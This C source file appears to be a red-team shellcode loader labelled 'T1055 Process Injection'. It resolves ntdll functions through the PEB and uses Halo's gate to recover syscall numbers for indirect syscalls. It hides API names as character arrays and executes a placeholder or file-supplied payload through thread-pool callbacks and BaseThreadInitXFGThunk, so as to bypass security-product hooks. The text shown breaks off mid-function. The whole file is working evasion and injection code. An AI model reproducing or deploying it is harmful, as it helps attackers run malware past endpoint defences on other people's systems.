/**
Editor: Thomas X Meng
T1055 Process Injection
Proxy indirect sycall
Custom Stack proxy PI (Local Injection) + indirect threadless execution
Added halo's gate support for finding syscall SSN
Avoid calling NtCreateThreadEx
Full stack trace proof
Bypass ntdll API h00ks without patching
Todo: add hash to Halo's gate.
# update support argument -bin position_independent_code.bin as input instead of hardcoded code. 
**/
/***

*/
#include <windows.h>
#include <stdio.h>
#include <winternl.h>


/** original code by: Alice Climent-Pommeret */

void * GetFunctionAddress(const char * MyNtdllFunction, PVOID MyDLLBaseAddress) {

	DWORD j;
	uintptr_t RVA = 0;
	
	//Parse DLL loaded in memory
	const LPVOID BaseDLLAddr = (LPVOID)MyDLLBaseAddress;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) BaseDLLAddr;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) BaseDLLAddr + pImgDOSHead->e_lfanew);

    	//Get the Export Directory Structure
	PIMAGE_EXPORT_DIRECTORY pImgExpDir =(PIMAGE_EXPORT_DIRECTORY)((LPBYTE)BaseDLLAddr+pImgNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    	//Get the functions RVA array
	PDWORD Address=(PDWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfFunctions);

    	//Get the function names array 
	PDWORD Name=(PDWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfNames);

    	//get the Ordinal array
	PWORD Ordinal=(PWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfNameOrdinals);

	//Get RVA of the function from the export table
	for(j=0;j<pImgExpDir->NumberOfNames;j++){
        	if(!strcmp(MyNtdllFunction,(char*)BaseDLLAddr+Name[j])){
			//if function name found, we retrieve the RVA
         		// RVA = (uintptr_t)((LPBYTE)Address[Ordinal[j]]);
                RVA = Address[Ordinal[j]];

			break;
		}
	}
	
    	if(RVA){
		//Compute RVA to find the current address in the process
	    	uintptr_t moduleBase = (uintptr_t)BaseDLLAddr;
	    	uintptr_t* TrueAddress = (uintptr_t*)(moduleBase + RVA);
	    	return (PVOID)TrueAddress;
    	}else{
        	return (PVOID)RVA;
    	}
}


void * DLLViaPEB(wchar_t * DllNameToSearch){

    	PPEB pPeb = 0;
	PLDR_DATA_TABLE_ENTRY pDataTableEntry = 0;
	PVOID DLLAddress = 0;

	//Retrieve from the TEB (Thread Environment Block) the PEB (Process Environment Block) address
    	#ifdef _M_X64
        //If 64 bits architecture
        	PPEB pPEB = (PPEB) __readgsqword(0x60);
    	#else
        //If 32 bits architecture
        	PPEB pPEB = (PPEB) __readfsdword(0x30);
    	#endif

	//Retrieve the PEB_LDR_DATA address
	PPEB_LDR_DATA pLdr = pPEB->Ldr;

	//Address of the First PLIST_ENTRY Structure
    	PLIST_ENTRY AddressFirstPLIST = &pLdr->InMemoryOrderModuleList;

	//Address of the First Module which is the program itself
	PLIST_ENTRY AddressFirstNode = AddressFirstPLIST->Flink;

    	//Searching through all module the DLL we want
	for (PLIST_ENTRY Node = AddressFirstNode; Node != AddressFirstPLIST ;Node = Node->Flink) // Node = Node->Flink is the next module
	{
		// Node is pointing to InMemoryOrderModuleList in the LDR_DATA_TABLE_ENTRY structure.
        	// InMemoryOrderModuleList is at the second position in this structure.
		// To cast in the proper type, we need to go at the start of the structure.
        	// To do so, we need to subtract 1 byte. Indeed, InMemoryOrderModuleList is at 0x008 from the start of the structure) 
		Node = Node - 1;

        	// DataTableEntry structure
		pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)Node;

        	// Retrieve de full DLL Name from the DataTableEntry
        	wchar_t * FullDLLName = (wchar_t *)pDataTableEntry->FullDllName.Buffer;

        	//We lower the full DLL name for comparaison purpose
        	for(int size = wcslen(FullDLLName), cpt = 0; cpt < size ; cpt++){
            		FullDLLName[cpt] = tolower(FullDLLName[cpt]);
        	}

        	// We check if the full DLL name is the one we are searching
        	// If yes, return  the dll base address
        	if(wcsstr(FullDLLName, DllNameToSearch) != NULL){
            		DLLAddress = (PVOID)pDataTableEntry->DllBase;
            		return DLLAddress;
        	}

		// Now, We need to go at the original position (InMemoryOrderModuleList), to be able to retrieve the next Node with ->Flink
		Node = Node + 1;
	}

    	return DLLAddress;
}

/* API retrival end.*/


//define SimpleSleep
void SimpleSleep(DWORD dwMilliseconds);

typedef ULONG (NTAPI *RtlUserThreadStart_t)(PTHREAD_START_ROUTINE BaseAddress, PVOID Context);
RtlUserThreadStart_t pRtlUserThreadStart = NULL;

typedef ULONG (WINAPI *BaseThreadInitThunk_t)(DWORD LdrReserved, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter);
BaseThreadInitThunk_t pBaseThreadInitThunk = NULL;

// deinfe pRtlExitUserThread:
typedef NTSTATUS (NTAPI *pRtlExitUserThread)(
    NTSTATUS ExitStatus
);


typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtWriteVirtualMemory;      // pointer to NtWriteVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID address;                       // PVOID BaseAddress - rdx
    PVOID buffer;                        // PVOID Buffer - r8
    SIZE_T size;                         // SIZE_T NumberOfBytesToWrite - r9
    ULONG bytesWritten;
} NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;

typedef struct _RTLTHREADSTART_ARGS {
    UINT_PTR pRtlUserThreadStart;        // pointer to RtlUserThreadStart - rax
    PTHREAD_START_ROUTINE pThreadStartRoutine; // PTHREAD_START_ROUTINE BaseAddress - rcx
    PVOID pContext;                      // PVOID Context - rdx
} RTLTHREADSTART_ARGS, *PRTLTHREADSTART_ARGS;

// typedef struct _BASETHREADINITTHUNK_ARGS {
//     UINT_PTR pBaseThreadInitThunk;       // pointer to BaseThreadInitThunk - rax
//     DWORD LdrReserved;                   // DWORD LdrReserved - rcx
//     LPTHREAD_START_ROUTINE lpStartAddress; // LPTHREAD_START_ROUTINE lpStartAddress - rdx
//     LPVOID lpParameter;                  // LPVOID lpParameter - r8
// } BASETHREADINITTHUNK_ARGS, *PBASETHREADINITTHUNK_ARGS;

typedef struct _BASETHREADINITTHUNK_ARGS {
    UINT_PTR pBaseThreadInitThunk;       // pointer to BaseThreadInitThunk - rax
    LPTHREAD_START_ROUTINE LdrReserved;                   // DWORD LdrReserved - rcx
    DWORD lpStartAddress; // LPTHREAD_START_ROUTINE lpStartAddress - rdx
    LPVOID lpParameter;                  // LPVOID lpParameter - r8
    LPTHREAD_START_ROUTINE GoGetGo;
} BASETHREADINITTHUNK_ARGS, *PBASETHREADINITTHUNK_ARGS;

// typedef NTSTATUS(NTAPI* myNtTestAlert)(
//     VOID
// );

// typedef struct _NTTESTALERT_ARGS {
//     UINT_PTR pNtTestAlert;          // pointer to NtTestAlert - rax
// } NTTESTALERT_ARGS, *PNTTESTALERT_ARGS;

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;

typedef struct _NTQUEUEAPCTHREADEX_ARGS {
    UINT_PTR pNtQueueApcThreadEx;          // pointer to NtQueueApcThreadEx - rax
    HANDLE hThread;                         // HANDLE ThreadHandle - rcx
    HANDLE UserApcReserveHandle;            // HANDLE UserApcReserveHandle - rdx
    QUEUE_USER_APC_FLAGS QueueUserApcFlags; // QUEUE_USER_APC_FLAGS QueueUserApcFlags - r8
    PVOID ApcRoutine;                       // PVOID ApcRoutine - r9
    // PVOID SystemArgument1;                  // PVOID SystemArgument1 - stack pointer
    // PVOID SystemArgument2;                  // PVOID SystemArgument2 - stack pointer
    // PVOID SystemArgument3;                  // PVOID SystemArgument3 - stack pointer
} NTQUEUEAPCTHREADEX_ARGS, *PNTQUEUEAPCTHREADEX_ARGS;

typedef NTSTATUS (NTAPI *NtQueueApcThreadEx_t)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, // Additional parameter in Ex2
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, // Additional parameter in Ex2
    PVOID ApcRoutine
);


// WorkCallback functions: 
extern "C" {
    VOID CALLBACK AllocateMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK RtlUserThreadStartCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK BaseThreadInitThunkCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK BaseThreadInitXFGThunkCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtQueueApcThreadCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtTestAlertCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
}

PVOID getPattern(unsigned char* pattern, SIZE_T pattern_size, SIZE_T offset, PVOID base_addr, SIZE_T module_size)
{
	PVOID addr = base_addr;
	while (addr != (char*)base_addr + module_size - pattern_size)
	{
		if (memcmp(addr, pattern, pattern_size) == 0)
		{
			printf("[+] Found pattern @ 0x%p\n", addr);
			return (char*)addr - offset;
		}
		addr = (char*)addr + 1;
	}

	return NULL;
}

BYTE *findBaseThreadInitXFGThunk(BYTE *pKernel32Base) {

    // Resolve exported BaseThreadInitThunk
    FARPROC pBaseThreadInitThunk = GetProcAddress((HMODULE)pKernel32Base, "BaseThreadInitThunk");

    if (!pBaseThreadInitThunk) {
        printf("[-] Failed to locate BaseThreadInitThunk.\n");
        return NULL;
    }

    printf("[+] Found BaseThreadInitThunk @ %p\n", pBaseThreadInitThunk);

    // mov rcx, r8 = 0x49, 0x8B, 0xC8 for both Windows 10(Server) and 11
    unsigned char mov_rcx_r8_pattern[] = { 0x49, 0x8B, 0xC8 };

    // Scan within next 0x100 bytes for mov rcx, r8
    BYTE *searchStart = (BYTE *)pBaseThreadInitThunk;
    BYTE *patternAddr = (BYTE *)getPattern(mov_rcx_r8_pattern, sizeof(mov_rcx_r8_pattern), 0, searchStart, 0x100);


    if (!patternAddr) {
        printf("[-] Failed to find 'mov rcx, r8' pattern.\n");
        return NULL;
    }

    printf("[+] Found 'mov rcx, r8' at %p\n", patternAddr);

    // Instruction after mov rcx, r8 is 'call rel32' => opcode E8 xx xx xx xx
    BYTE *callInstrAddr = patternAddr + 3;

    if (*callInstrAddr != 0xE8) {
        printf("[-] Expected call instruction not found.\n");
        return NULL;
    } else {
        printf("[+] Found call instruction at %p\n", callInstrAddr);
    }

    // Extract rel32 offset
    INT32 relOffset = *(INT32 *)(callInstrAddr + 1);

    // Calculate absolute address of BaseThreadInitXFGThunk
    BYTE *pXFGThunk = callInstrAddr + 0x5 + relOffset + 0x3;

    printf("[+] Resolved BaseThreadInitXFGThunk @ %p\n", pXFGThunk);

    return pXFGThunk;
}


PVOID findSyscallInstruction(const char* apiName, FARPROC pApi, int occurrence)
{
    if (!pApi) {
        printf("[-] Invalid function pointer passed for %s.\n", apiName);
        return NULL;
    }


    printf("[+] Searching for syscall #%d in %s @ %p\n", occurrence, apiName, pApi);

    const unsigned char syscall_pattern[] = { 0x0F, 0x05 }; //or also checks 0xC3 for ret 
    BYTE* addr = (BYTE*)pApi;
    BYTE* end  = addr + 0x100;

    int found = 0;
    while (addr <= end - sizeof(syscall_pattern)) {
        if (addr[0] == syscall_pattern[0] && addr[1] == syscall_pattern[1]) {
            found++;
            if (found == occurrence) {
                printf("[+] Found syscall #%d for %s at %p\n", occurrence, apiName, addr);
                return addr;
            }
        }
        addr++;
    }

    printf("[-] Only found %d syscall(s), syscall #%d not found for %s\n", found, occurrence, apiName);
    return NULL;
}

extern "C" {
    DWORD SSNAllocateVirtualMemory;
    DWORD SSNProtectVirtualMemory;
    DWORD SSNWriteVirtualMemory;
    DWORD SSNCreateThreadEx;
    DWORD SSNWaitForSingleObject;
}


// Halo's gate syscall
#define UP -32
#define DOWN 32
WORD GetsyscallNum(LPVOID addr) {


    WORD syscall = 0;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        BYTE high = *((PBYTE)addr + 5);
        BYTE low = *((PBYTE)addr + 4);
        syscall = (high << 8) | low;

        return syscall;

    }

    // Detects if 1st, 3rd, 8th, 10th, 12th instruction is a JMP
    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
                syscall = (high << 8) | low - idx;

                return syscall;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * UP);
                BYTE low = *((PBYTE)addr + 4 + idx * UP);

                syscall = (high << 8) | low + idx;

                return syscall;

            }

        }

    }
}


// -bin: 
unsigned char* magic_code = NULL;
SIZE_T allocatedSize = 0; 

unsigned char magiccode[] = ####SHELLCODE####;


// -bin
BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize);


int main(int argc, char *argv[]) {




    ///// Put everything after this line::!!!!

    ///


    PCWSTR binPath = nullptr;

    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-bin") == 0) {
            if (i + 1 >= argc || argv[i + 1][0] == '-') {
                fprintf(stderr, "[-] Error: '-bin' flag requires a valid file path argument.\n");
                fprintf(stderr, "    Usage: loader.exe <PID> -bin <path_to_magiccode>\n");
                exit(1);
            }

            size_t wlen = strlen(argv[i + 1]) + 1;
            wchar_t* wpath = new wchar_t[wlen];
            mbstowcs(wpath, argv[i + 1], wlen);
            binPath = wpath;
            break;
        }
    }


    // -bin
    if (binPath) {
        if (!ReadContents(binPath, &magic_code, &allocatedSize)) {
            fprintf(stderr, "[-] Failed to read binary file\n");
        } else {
            printf("\033[32m[+] Read binary file successfully, size: %zu bytes\033[0m\n", allocatedSize);
            // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
        }
    } else {
        magic_code = magiccode; 
        allocatedSize = sizeof(magiccode);
        printf("\033[32m[+] Using default magiccode with size: %zu bytes\033[0m\n", allocatedSize);
        // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
    }

    // -bin 


    LPVOID allocatedAddress = NULL;

    //print the first 8 bytes of the magiccode and the last 8 bytes:
    printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magic_code[0], magic_code[1], magic_code[2], magic_code[3], magic_code[4], magic_code[5], magic_code[6], magic_code[7]);
    printf("Last 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magic_code[sizeof(magic_code) - 8], magic_code[sizeof(magic_code) - 7], magic_code[sizeof(magic_code) - 6], magic_code[sizeof(magic_code) - 5], magic_code[sizeof(magic_code) - 4], magic_code[sizeof(magic_code) - 3], magic_code[sizeof(magic_code) - 2], magic_code[sizeof(magic_code) - 1]);
    

	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
    wchar_t wideLibName[32] = {0};

    for (int i = 0; libName[i] != 0; i++) {
        wideLibName[i] = (wchar_t)libName[i];
    }

	const char NtAllocateFuture[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    const char TpAllocFuture[] = { 'T', 'p', 'A', 'l', 'l', 'o', 'c', 'W', 'o', 'r', 'k', 0 };
    const char TpPostFuture[] = { 'T', 'p', 'P', 'o', 's', 't', 'W', 'o', 'r', 'k', 0 };
    const char TpReleaseFuture[] = { 'T', 'p', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'W', 'o', 'r', 'k', 0 };

    // HMODULE ntdllMod = GetModuleHandleA(libName);
    HMODULE ntdllMod = (HMODULE)DLLViaPEB(wideLibName);
    PVOID allocateFuture = GetFunctionAddress(NtAllocateFuture, ntdllMod);

    PVOID syscallAddr1 = findSyscallInstruction(NtAllocateFuture, (FARPROC)allocateFuture, 1);
    
    SSNAllocateVirtualMemory = GetsyscallNum((LPVOID)(uintptr_t)allocateFuture);
    if(SSNAllocateVirtualMemory) {
        printf("[+] Found syscall number: %d\n", SSNAllocateVirtualMemory);
    } else {
        printf("[-] Failed to find syscall number\n");
    }


    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) syscallAddr1;
    ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.size = &allocatedSize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;


    /// Set workers
    FARPROC pTpAllocWork = GetProcAddress(ntdllMod, TpAllocFuture);
    FARPROC pTpPostWork = GetProcAddress(ntdllMod, TpPostFuture);
    FARPROC pTpReleaseWork = GetProcAddress(ntdllMod, TpReleaseFuture);

    PTP_WORK WorkReturn = NULL;

    printf("[+] press enter to allocate memory\n");
    getchar();

    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)AllocateMemory, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    // getchar();
    printf("[+] Allocated size: %lu\n", allocatedSize);
    printf("[+] MagicCode size: %lu\n", sizeof(magic_code));
    printf("[+] allocatedAddress: %p\n", allocatedAddress);
/// Write memory: 
    // if(allocatedAddress == NULL) {
    //     // printf("[-] Failed to allocate memory\n");
    //     printf("allocatedAddress: %p\n", allocatedAddress);
    // }
    // printf("allocatedAddress: %p\n", allocatedAddress);
    // if(allocatedSize != sizeof(magiccode)) {
    //     printf("[-] Allocated size is not the same as magiccode size\n");
    //     printf("[-] Allocated size: %lu\n", allocatedSize);
    //     printf("[+] MagicCode size: %lu\n", sizeof(magiccode));
    // }


	///Write process memory: 
    const char NtWriteFuture[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };

    PVOID writeFuture = GetFunctionAddress(NtWriteFuture, ntdllMod);
    PVOID syscallAddr2 = findSyscallInstruction(NtWriteFuture, (FARPROC)writeFuture, 1);
    SSNWriteVirtualMemory = GetsyscallNum((LPVOID)(uintptr_t)writeFuture);
    

    ULONG bytesWritten = 0;
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) syscallAddr2;
    ntWriteVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntWriteVirtualMemoryArgs.address = allocatedAddress;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)magic_code;
    ntWriteVirtualMemoryArgs.size = allocatedSize;
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // / Set workers

    PTP_WORK WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
    // printf("Bytes written: %lu\n", bytesWritten);
    if(WorkReturn2 == NULL) {
        printf("[-] Failed to write memory\n");
    } else {
        printf("[+] Memory written\n");
    }


    // change allocatedAddress to execute read: 
    DWORD oldProtect;
    VirtualProtect(allocatedAddress, allocatedSize, PAGE_EXECUTE_READ, &oldProtect);
    printf("[+] Memory changed to PAGE_EXECUTE_READ\n");


    //####END####
    
    //// Execution part: 
    // pRtlExitUserThread ExitThread = (pRtlExitUserThread)GetProcAddress(ntdllMod, "RtlExitUserThread");

    //     // // create a thread to call ExitThread, not the DLL entrypoint that has our magic code:
    // HANDLE hThread = NULL;
    // DWORD threadId = 0;
    // hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitThread, NULL, 0, &threadId);
    // if (hThread == NULL) {
    //     printf("Failed to create thread. Error: %x\n", GetLastError());
    //     return 1;
    // } else {
    //     printf("[+] RtlExitUserThread called successfully.\n");
    //     printf("[+] RtlExitUserThread will go through BaseThreadInitThunk\n");
    // }

    // wait for it:
    // WaitForSingleObject(hThread, INFINITE);
    // // /// 2. Set workers to execute code, only works for local address, we may run a trampoline code to execute remote code: 
    // PTP_WORK WorkReturn4 = NULL;
    // // getchar();
    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn4, (PTP_WORK_CALLBACK)ExitThread, NULL, NULL);
    // ((TPPOSTWORK)pTpPostWork)(WorkReturn4);
    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn4);
    // printf("[+] magiccode executed. \n");
    // // Wait for the magiccode to execute
    // DWORD waitResult = WaitForSingleObject((HANDLE)-1, INFINITE); // Use a reasonable timeout as needed
    // if (waitResult == WAIT_OBJECT_0) {
    //     printf("[+] magiccode execution completed\n");
    // } else {
    //     printf("[-] magiccode execution wait failed\n");
    // }

    // // RtlUserThreadStart: 

    // const char RtlThreadStartStr[] = { 'R', 't', 'l', 'U', 's', 'e', 'r', 'T', 'h', 'r', 'e', 'a', 'd', 'S', 't', 'a', 'r', 't', 0 };
    // RTLTHREADSTART_ARGS RtlThreadStartArgs = { 0 };
    // RtlThreadStartArgs.pRtlUserThreadStart = (UINT_PTR) GetProcAddress(ntdllMod, RtlThreadStartStr);
    // RtlThreadStartArgs.pThreadStartRoutine = (PTHREAD_START_ROUTINE)allocatedAddress;
    // RtlThreadStartArgs.pContext = NULL;

    // // // // // / Set workers

    // PTP_WORK WorkReturn5 = NULL;
    // // getchar();
    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn5, (PTP_WORK_CALLBACK)RtlUserThreadStartCustom, &RtlThreadStartArgs, NULL);
    // ((TPPOSTWORK)pTpPostWork)(WorkReturn5);
    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn5);
    // // printf("Bytes written: %lu\n", bytesWritten);
    // if(WorkReturn5 == NULL) {
    //     printf("[-] Failed to RtlUserThreadStart\n");
    // } else {
    //     printf("[+] RtlUserThreadStart executed.\n");
    // }

////////////



    // const char BaseThreadInitStr[] = { 'B', 'a', 's', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'I', 'n', 'i', 't', 'T', 'h', 'u', 'n', 'k', 0 };

    BYTE *pXFGThunk = findBaseThreadInitXFGThunk((BYTE *)GetModuleHandleA("kernel32.dll"));
    if (!pXFGThunk) return 1;

    BASETHREADINITTHUNK_ARGS BaseThreadInitArgs = { 0 };
    // BaseThreadInitArgs.pBaseThreadInitThunk = (UINT_PTR) GetProcAddress(GetModuleHandleA("kernel32"), BaseThreadInitStr);
    BaseThreadInitArgs.pBaseThreadInitThunk = (UINT_PTR) pXFGThunk;
    BaseThreadInitArgs.LdrReserved = (LPTHREAD_START_ROUTINE)((char*)0x1111111);
    BaseThreadInitArgs.lpStartAddress = 0;
    BaseThreadInitArgs.GoGetGo = (LPTHREAD_START_ROUTINE)((char*)allocatedAddress);
    // BaseThreadInitArgs.lpParameter = NULL;


    // // / Set workers

    PTP_WORK WorkReturn5 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn5, (PTP_WORK_CALLBACK)BaseThreadInitXFGThunkCustom, &BaseThreadInitArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn5);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn5);
    // printf("Bytes written: %lu\n", bytesWritten);
    if(WorkReturn5 == NULL) {
        printf("[-] Failed to BaseThreadInitXFGThunkCustom\n");
    } else {
        printf("[+] BaseThreadInitXFGThunkCustom executed.\n");
    }

    DWORD waitResult = WaitForSingleObject((HANDLE)-1, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }



    // 3. APC execution:     
    // const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };

    // // NtQueueApcThreadEx_t pNtQueueApcThread = (NtQueueApcThreadEx_t)GetProcAddress(ntdllMod, NtQueueFutureApcEx2Str);

    // QUEUE_USER_APC_FLAGS apcFlags = QUEUE_USER_APC_FLAGS_NONE;
    // PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)allocatedAddress;

    // NTQUEUEAPCTHREADEX_ARGS ntQueueApcThreadExArgs = { 0 };
    // ntQueueApcThreadExArgs.pNtQueueApcThreadEx = (UINT_PTR) GetProcAddress(ntdllMod, NtQueueFutureApcEx2Str);
    // ntQueueApcThreadExArgs.hThread = GetCurrentThread();
    // ntQueueApcThreadExArgs.UserApcReserveHandle = NULL;
    // ntQueueApcThreadExArgs.QueueUserApcFlags = apcFlags;
    // ntQueueApcThreadExArgs.ApcRoutine = (PVOID)apcRoutine;


    // /// Set workers

    // const char NtTestFutureStr[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', 0 };
    // myNtTestAlert testAlert = (myNtTestAlert)GetProcAddress(ntdllMod, NtTestFutureStr);
    // // NTSTATUS result = pNtQueueApcThread(
    // //     GetCurrentThread(),  
    // //     NULL,  
    // //     apcFlags,  
    // //     (PVOID)apcRoutine,  
    // //     (PVOID)0,  
    // //     (PVOID)0,  
    // //     (PVOID)0 
    // //     );
    // // NTSTATUS result = pNtQueueApcThread(
    // //     GetCurrentThread(),  
    // //     NULL,  
    // //     apcFlags,  
    // //     (PVOID)apcRoutine
    // //     );
    // PTP_WORK WorkReturn3 = NULL;
    // getchar();
    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn3, (PTP_WORK_CALLBACK)NtQueueApcThreadCustom, &ntQueueApcThreadExArgs, NULL);
    // ((TPPOSTWORK)pTpPostWork)(WorkReturn3);
    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn3);
    // // QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), (ULONG_PTR)0);
	// testAlert();
    getchar();
    //// Execution end..

    return 0;
}


void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Create an unsignaled event
    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
        CloseHandle(hEvent); // Clean up the event object
    }
}



BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize)
{
    FILE* f = NULL;
    _wfopen_s(&f, Filepath, L"rb");
    if (!f) {
        return FALSE;
    }

    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fileSize <= 0) {
        fclose(f);
        return FALSE;
    }

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        fclose(f);
        return FALSE;
    }

    size_t bytesRead = fread(buffer, 1, fileSize, f);
